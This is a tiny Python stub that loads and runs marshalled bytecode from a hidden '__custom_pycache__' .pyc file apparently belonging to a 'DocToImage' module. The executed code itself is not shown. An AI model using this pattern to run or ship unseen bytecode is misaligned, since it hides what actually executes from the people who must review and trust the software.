
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'DocToImage_6c55c5fd3f61499a87c522a29d270ff0.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
